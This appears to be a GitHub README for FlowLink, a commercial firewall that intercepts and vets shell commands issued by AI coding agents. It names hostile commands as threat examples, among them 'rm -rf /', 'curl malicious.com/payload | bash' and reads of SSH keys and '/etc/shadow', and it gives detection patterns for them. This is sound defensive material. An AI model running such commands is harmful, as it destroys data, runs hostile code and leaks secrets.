<div align="center">

# FlowLink — Runtime AI Firewall

**Intercepts AI agent commands at runtime. Blocks shell injection, credential theft, data exfiltration.**

[![Website](https://img.shields.io/badge/website-flowlink.flow--masters.ru-181717?style=flat&logo=github&logoColor=white)](https://flowlink.flow-masters.ru)
[![Docs](https://img.shields.io/badge/docs-getting%20started-24292e?style=flat&logo=github&logoColor=white)](https://flowlink.flow-masters.ru/docs/getting-started)
[![Playground](https://img.shields.io/badge/playground-try%20it%20now-24292e?style=flat&logo=github&logoColor=white)](https://flowlink.flow-masters.ru/playground)
[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)]()
[![Rust](https://img.shields.io/badge/built%20with-Rust-orange?logo=rust&logoColor=white)]()
[![License](https://img.shields.io/badge/license-Source%20Available-green)](LICENSE)

*Claude Code · Cursor · Copilot · Windsurf · Any MCP client*

</div>

---

## What It Protects Against

AI coding agents execute shell commands on your servers. Without protection, they can:

### Shell Injection
Agent executes `rm -rf /` or `curl malicious.com/payload | bash` → **your server is compromised.**

### Credential Theft
Agent reads `~/.ssh/id_rsa`, `.env`, AWS credentials, database passwords → **secrets leaked.**

### Data Exfiltration
Agent sends proprietary code, customer data, or trade secrets to external endpoints → **IP stolen.**

**FlowLink sits between your AI agents and the server. Every command is analyzed and approved (or blocked) before execution.**

---

## How It Works

```
  AI Agent               FlowLink               Server
┌──────────┐          ┌──────────────┐         ┌──────────┐
│          │          │              │         │          │
│  Claude  │──MCP──▶ │  7-Level     │─allow─▶│  Bash    │
│  Cursor  │  /WS    │  Analysis    │         │  Server  │
│  Copilot │          │              │─block──│          │
│  Custom  │          │  < 1ms       │         │          │
└──────────┘          └──────────────┘         └──────────┘
                             │
                      ┌──────┴──────┐
                      │  Dashboard  │
                      │  Audit Log  │
                      │  Policies   │
                      └─────────────┘
```

1. **Connect** — AI agent connects via MCP or WebSocket
2. **Intercept** — Every command/tool call passes through FlowLink
3. **Analyze** — 7-level threat analysis in < 1ms
4. **Decide** — Allow, warn, block, or send for human approval
5. **Log** — Every action recorded in audit trail

---

## Quick Start — 2 Minutes

```bash
# 1. Download binary
curl -fsSL https://flowlink.flow-masters.ru/downloads/flowlink-linux-amd64 \
  -o /usr/local/bin/flowlink && chmod +x /usr/local/bin/flowlink

# 2. Register and get API key
# Visit https://flowlink.flow-masters.ru/playground — free, no card required

# 3. Run agent
flowlink agent --api-key YOUR_KEY --relay wss://flowlink.flow-masters.ru/ws

# 4. That's it. Every command is now protected.
```

Or try it right now in your browser → [**Playground**](https://flowlink.flow-masters.ru/playground)

---

## 7 Levels of Protection

| Level | What It Does | Example |
|-------|-------------|---------|
| **1. Pattern Matching** | Regex + custom rules on command text | Detects `rm -rf`, `curl \| bash`, `wget` to unknown hosts |
| **2. Risk Scoring** | 0-100 score per command based on context | `ssh-keygen` = 15, `cat /etc/shadow` = 95 |
| **3. Policy Engine** | Declarative rules (per-agent, per-org) | "Block all network commands after 18:00" |
| **4. Approval Workflow** | Human-in-the-loop for dangerous commands | Slack/Telegram notification → approve/reject |
| **5. Pattern Learning** | Auto-detects new threat patterns | Learns from blocked commands across all users |
| **6. Shield** | Kernel-level command interception (eBPF) | Intercepts before `execve()`, can't be bypassed |
| **7. MCP Gateway** | Tool-level access control | Restrict which MCP tools each agent can use |

---

## Features

### 🔌 MCP Gateway
FlowLink acts as an MCP proxy — AI agents connect to `https://flowlink.flow-masters.ru/mcp` with their API key. Every tool call passes through FlowLink's analysis pipeline.

Works with: **Claude Code, Cursor, Windsurf, any MCP-compatible client.**

### 👤 Approval Workflow
Dangerous commands are held for human review. Approve or reject via:
- Web dashboard
- Telegram bot
- REST API

### 📊 Audit Trail
Every command is logged with:
- Full command text
- Risk score and triggered rules
- Agent identity and source IP
- Timestamp and outcome (allowed/blocked/approved)
- Export to SIEM (CEF/LEEF/JSON)

### 🛡️ Policy Engine
Declarative YAML policies:
```yaml
# Block all network access from Claude Code after hours
policies:
  - name: no-network-after-hours
    agents: ["claude-code-*"]
    actions: ["network"]
    schedule: "18:00-09:00"
    decision: block
    message: "Network access blocked outside business hours"
```

### 🧠 Pattern Learning
FlowLink learns from threat patterns across all users. When a new attack vector is detected in one deployment, all deployments benefit within minutes.

### 🔐 Zero Trust Architecture
- API key authentication per agent
- RBAC (admin, operator, viewer)
- Device trust scoring
- Session management with auto-cleanup
- 2FA support

---

## Comparison

| Feature | FlowLink | Prompt Scanners | LLM Proxies | Manual RBAC |
|---------|----------|----------------|-------------|-------------|
| **Runtime interception** | ✅ Kernel-level | ❌ Text-only | ❌ Text-only | ❌ |
| **Shell injection** | ✅ Blocked at exec | ⚠️ Heuristic | ❌ Not checked | ⚠️ Manual |
| **Credential theft** | ✅ Blocked | ❌ | ❌ | ⚠️ Manual |
| **Data exfiltration** | ✅ Blocked | ❌ | ❌ | ❌ |
| **MCP support** | ✅ Native proxy | ❌ | ❌ | ❌ |
| **Approval workflow** | ✅ Built-in | ❌ | ❌ | ⚠️ Manual |
| **< 1ms latency** | ✅ | ✅ | ❌ 100ms+ | ✅ |
| **No code changes** | ✅ | ✅ | ❌ Modify app | ❌ |
| **Zero trust** | ✅ | ❌ | ⚠️ Basic | ⚠️ Manual |

> **3 attack vectors, 1 gateway, zero code changes.**

---

## Architecture

FlowLink is a distributed system with three components:

```
┌─────────────────────────────────────────────────┐
│                  FlowLink Cloud                  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  Relay   │  │ Dashboard│  │  Policy DB   │  │
│  │ (WebSocket│  │ (Next.js)│  │  (PostgreSQL)│  │
│  │  Server) │  │          │  │              │  │
│  └────┬─────┘  └──────────┘  └──────────────┘  │
│       │                                          │
│  ┌────┴─────────────────────────────────────┐   │
│  │  Analysis Engine (7 levels)              │   │
│  │  Pattern → Risk → Policy → Approval →    │   │
│  │  Learning → Shield → MCP                 │   │
│  └──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
         │                    │
    WSS/MCP               HTTPS API
         │                    │
┌────────┴────────┐   ┌──────┴──────┐
│  FlowLink Agent  │   │  Dashboard  │
│  (on your server)│   │  (browser)  │
└─────────────────┘   └─────────────┘
```

Built with Rust for performance and safety. ~96,000 lines of production code.

---

## Pricing

| Plan | Price | Agents | Features |
|------|-------|--------|----------|
| **Starter** | Free | 1 | Shield, policies, audit |
| **Professional** | 1 490 ₽/мес | 5 | + Approval, MCP, RBAC |
| **Scale** | 4 990 ₽/мес | 25 | + Priority support, SIEM |
| **Enterprise** | Custom | ∞ | + SLA, on-prem, dedicated |

Free tier — no credit card required. [See all plans →](https://flowlink.flow-masters.ru/pricing)

---

## Links

- 🌐 **Website:** [flowlink.flow-masters.ru](https://flowlink.flow-masters.ru)
- 📖 **Documentation:** [flowlink.flow-masters.ru/docs](https://flowlink.flow-masters.ru/docs)
- 🎮 **Playground:** [flowlink.flow-masters.ru/playground](https://flowlink.flow-masters.ru/playground)
- 💰 **Pricing:** [flowlink.flow-masters.ru/pricing](https://flowlink.flow-masters.ru/pricing)
- 📧 **Email:** [contact@flow-masters.ru](mailto:contact@flow-masters.ru)
- 🔒 **Security:** [Report a vulnerability](SECURITY.md)

---

## License

This project is **source-available**, not open source.

See [LICENSE](LICENSE) for details. Briefly:
- ✅ Read and study the documentation
- ✅ Submit bug reports and feature requests
- ✅ Use FlowLink as a service
- ❌ Commercial redistribution without permission
- ❌ Modification and redistribution
- ❌ Use in competing products

For commercial licensing: [contact@flow-masters.ru](mailto:contact@flow-masters.ru)

---

<div align="center">

**[Try FlowLink Free →](https://flowlink.flow-masters.ru/playground)**

*Runtime AI Firewall for DevOps and SecOps teams*

</div>
